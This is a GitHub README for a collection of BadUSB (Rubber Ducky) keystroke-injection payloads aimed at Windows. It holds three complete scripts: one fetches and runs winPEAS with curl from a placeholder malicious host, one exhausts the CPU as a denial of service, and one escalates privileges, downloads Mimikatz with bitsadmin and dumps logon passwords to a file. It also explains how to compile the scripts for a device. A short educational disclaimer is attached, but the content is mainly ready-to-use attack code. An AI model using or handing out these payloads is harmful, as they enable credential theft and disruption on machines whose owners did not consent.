
# P A Y L O A D S
<div align="center">
  <h1 align="center">
    <img src="https://github.com/DannnyzZ/Payloads/blob/main/payload.jpg" alt="Payload" style="width: 66%; display: block; margin: 0 auto;" />
  </h1>
</div>

<p align="center">
  <img src="https://img.shields.io/badge/Batch-Script-brightgreen.svg?style=for-the-badge&logo=Windows&logoColor=white" alt="Batch" />
  <img src="https://img.shields.io/badge/Rubber%20Ducky-Hardware-red.svg?style=for-the-badge&logo=usb&logoColor=white" alt="Rubber Ducky" />
  <img src="https://img.shields.io/badge/Bad%20USB-Hardware-purple.svg?style=for-the-badge&logo=security&logoColor=white" alt="Bad USB" />
  <img src="https://img.shields.io/badge/PowerShell-Script-blue.svg?style=for-the-badge&logo=powershell&logoColor=white" alt="PowerShell" />
  <img src="https://img.shields.io/badge/Payload-Content-orange.svg?style=for-the-badge&logo=file&logoColor=white" alt="Payload" />
</p>


</div>

---


## 📒 Table of Contents
- [📒 Table of Contents](#-table-of-contents)
- [📍 Overview](#-overview)
- [⚙️ Features](#️-features)
- [👾 List of Bad USB scripts](#-list-of-Bad-USB-scripts)
  - [1️⃣ winPEAS payload delivered by curl](#️-winPEAS-payload-delivered-by-curl)
  - [2️⃣ DoS - processor exhaustion](#️-DoS---processor-exhaustion)
  - [3️⃣ Mimikatz payload delivered by BITSAdmin](#️-Mimikatz-payload-delivered-by-BITSAdmin)
- [🚀 Getting Started](#-getting-started)
  - [✔️ Prerequisites](#️-prerequisites)
  - [💻 Installation](#-installation)
  - [🎮 Generating payloads](#-Generating-payloads)
  - [⚠️ Warning](#-warning)
- [🤝 Contributing](#-contributing)
- [📄 License](#-license)
- [👏 Acknowledgments](#-acknowledgments)


---


## 📍 Overview


***Payload*** represents the core and often malicious component of code or an attack that is responsible for executing specific actions on a target system. These actions can range from gaining unauthorized access, extracting sensitive data, to compromising the integrity of the targeted software or hardware. Payloads are typically designed to exploit vulnerabilities and are delivered via various means, including email attachments, compromised files, or even physical devices such as USB drives. 

***BadUSB*** is a computer security attack using USB devices that are programmed with malicious software.For example, USB flash drives can contain a programmable Intel 8051 microcontroller, which can be reprogrammed, turning a USB flash drive into a malicious device. This attack works by programming the fake USB flash drive to emulate a keyboard, which once plugged into a computer, is automatically recognized and allowed to interact with the computer, and can then initiate a series of keystrokes which open a command window and issue commands to download malware.


---


## 👾 List of Bad USB scripts

### 1️⃣ winPEAS payload delivered by curl

This script performs the delivery and execution of a potentially malicious file (winPEAS.exe) from a remote location. Its intent, is to open a Command Line on a target Windows system and then fetch via curl and run a payload from a specified URL.

```sh
REM Title: Bad USB - winPEAS payload delivered by curl
REM Author: DannnyzZ
REM Date: 10.15.2023
REM Description: Opens commandline, then curls payload from github repository
REM Target: Windows 10/11 (cmd)
REM Version: 1.0

REM Pause for everything to recognize and be ready
DELAY 2000

REM Open Command Line
CTRL ESC
DELAY 750
STRING cmd
DELAY 250
ENTER
DELAY 1000
ENTER

REM Execute curl payload from link
@echo off
REM Input command
STRING @echo off && set "downloadURL=https://www.malicious.com/winPEAS.exe" && set "downloadPath=%USERPROFILE%\winPEAS.exe" && set "runCommand=%USERPROFILE%\winPEAS.exe"
ENTER
DELAY 750
STRING curl -LJO "%downloadURL%" && move "winPEAS.exe" "%downloadPath%" && start "" "%runCommand%"
ENTER
```

### 2️⃣ DoS - processor exhaustion

The technical intent of this script is to cause a denial of service (DoS) condition by exhausting the target system's CPU, making it unresponsive and potentially leading to system instability. This type of attack is disruptive and can cause significant disruption to the target system's operation.

```sh
REM Title: Bad USB - Processor Exhaustion
REM Author: DannnyzZ
REM Date: 10.15.2023
REM Description: Opens commandline, then executes PC stress test.
REM Target: Windows 10/11 (cmd)
REM Version: 1.0

REM Pause for everything to recognize and be ready
DELAY 2000

REM Open Command Line
CTRL ESC
DELAY 750
STRING cmd
DELAY 250
ENTER
DELAY 1000
ENTER

REM Input command
STRING for /l %i in (1,1,1000000) do echo. 2^32 | find /r ".*"
ENTER
```

### 3️⃣ Mimikatz payload delivered by BITSAdmin

This script is a malicious payload designed to harvest login credentials from the target system using Mimikatz. The script delivers Mimikatz via BITSAdmin and then runs it to capture login passwords and save them to a file.

```sh
REM Title: Bad USB - Mimikatz via bitsadmin
REM Author: DannnyzZ
REM Date: 10.15.2023
REM Description: MIMIKATZ drop credentials on desktop
REM Target: Windows 10/11 (cmd)
REM Version: 1.0

REM Pause for everything to recognize and be ready
DELAY 2000

REM Elevate priviledges
DELAY 750  
GUI r 
DELAY 1000
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 750  
ALT t 
DELAY 750  
ENTER
DELAY 500
STRING bitsadmin /transfer "mimikatz" /download /priority foreground "https://www.malicious.com/mimikatz.exe" "C:\Users\Public\mimikatz.exe"
ENTER
DELAY 3000

REM Execute commands in mimikatz
STRING start C:\Users\Public\mimikatz.exe
ENTER
DELAY 500
STRING privilege::debug
ENTER
DELAY 1000
STRING sekurlsa::logonpasswords >> C:\Users\Public\dump.txt
ENTER
DELAY 1000
```


## 🚀 Getting Started


### ✔️ Prerequisites

Before you begin, ensure that you have the following:

` 1. USB Rubber Ducky, Malduino, any other Bad USB device `

` 2. SD Card adapter `

` 3. Internet connection `


### 🎮 Generating payloads


1. Choose payload in .txt extension, and copy its contents
2. Go to the site below and paste it there:
```sh
https://payloadstudio.hak5.org/community/
```
3. Generate payload out of text (it will be in .bin extension)
4. Store finished payload on any Bad USB of your choice.


---


### ⚠️ Disclaimer


**The owner of this GitHub repository takes no responsibility for the use of the payloads provided. It is essential to understand that the owner disclaims any liability for their use, and these payloads are intended for educational purposes only.**


---


## 🤝 Contributing


Contributions are always welcome! Please follow these steps:
1. Fork the project repository. This creates a copy of the project on your account that you can modify without affecting the original project.
2. Clone the forked repository to your local machine using a Git client like Git or GitHub Desktop.
3. Create a new branch with a descriptive name (e.g., `NEW_FIX`).
```sh
git checkout -b NEW_FIX
```
4. Make changes to the project's codebase.
5. Commit your changes to your local branch with a clear commit message that explains the changes you've made.
```sh
git commit -m 'Applied changes.'
```
6. Push your changes to your forked repository on GitHub using the following command
```sh
git push origin NEW_FIX
```
7. Create a new pull request to the original project repository. In the pull request, describe the changes you've made and why they're necessary.
The project maintainers will review your changes and provide feedback or merge them into the main branch.


---


## 📄 License


This project is licensed under the `ℹ️  MIT` License. 


---


## 👏 Acknowledgments

  `ℹ️  Hak5 PayloadStudio`

  `ℹ️  Ducktoolkit`
   
  `ℹ️  ChatGPT 4.0`
  
  `ℹ️  Mimikatz`

  `ℹ️  winPEAS`

---
